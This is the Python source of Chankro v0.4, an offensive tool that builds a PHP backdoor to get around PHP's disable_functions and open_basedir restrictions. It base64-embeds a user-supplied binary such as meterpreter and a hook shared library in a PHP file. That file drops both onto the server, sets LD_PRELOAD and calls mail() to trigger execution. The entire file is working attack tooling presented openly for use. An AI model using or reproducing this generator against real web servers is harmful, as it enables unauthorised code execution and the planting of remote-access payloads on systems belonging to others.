######## Chankro v0.4 #######

# [+] Bypass disable_functions
# [+] Bypass open_basedir

##############################
#          @TheXC3LL         #
##############################


import argparse
import base64
import os
import sys

parser = argparse.ArgumentParser(description='Generate PHP backdoor')
parser.add_argument('--arch', dest='arch', help='Architecture (32 or 64)')
parser.add_argument('--input', dest='meter', help='Binary to be executed (e.g., meterpreter)')
parser.add_argument('--output', dest='out', help='PHP filename')
parser.add_argument('--path', dest='pati', help='Absolute path')
args = parser.parse_args()

# Path where the tool is installed
script_path = os.path.dirname(os.path.realpath(__file__))

print("\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n")

if not args.meter:
    print("[!] Error: please select a valid file as input")
    sys.exit()

try:
    with open(args.meter, "rb") as file:
        encoded_shell = base64.b64encode(file.read()).decode()
except:
    print("[!] Error: file could not be opened")
    sys.exit()

if not args.out:
    print("[!] Error: please select a valid file as output")
    sys.exit()

try:
    if os.path.isabs(args.out):
        outfile = open(args.out, "w")  # absolute path provided
    else:
        outfile = open(os.path.join(os.getcwd(), args.out), "w")  # relative path provided
except:
    print("[!] Error: file could not be created")
    sys.exit()

if not args.arch:
    print("[!] Error: select architecture (64 or 32)")
    sys.exit()
elif args.arch not in ["32", "64"]:
    print("[!] Error: unknown architecture")
    sys.exit()
else:
    archi = os.path.join(script_path, f"hook{args.arch}.so")

if not args.pati:
    print("[!] Error: remote path")
    sys.exit()

try:
    with open(archi, "rb") as bicho:
        encoded_bicho = base64.b64encode(bicho.read()).decode()
except:
    print("[!] Error: could not read architecture-specific file")
    sys.exit()

head = f"<?php\n $hook = '{encoded_bicho}';\n"
body1 = f"$meterpreter = '{encoded_shell}';\n"
body2 = f"file_put_contents('{args.pati}/chankro.so', base64_decode($hook));\n"
body3 = f"file_put_contents('{args.pati}/acpid.socket', base64_decode($meterpreter));\n"
cosa3 = f"putenv('CHANKRO={args.pati}/acpid.socket');\n"
tail1 = f"putenv('LD_PRELOAD={args.pati}/chankro.so');\n"
tail2 = "mail('a','a','a','a');?>"

print(f"[+] Binary file: {args.meter}")
print(f"[+] Architecture: x{args.arch}")
print(f"[+] Final PHP: {args.out}\n\n")

outfile.write(head + body1 + body2 + body3 + cosa3 + tail1 + tail2)
outfile.close()
print("[+] File created!")
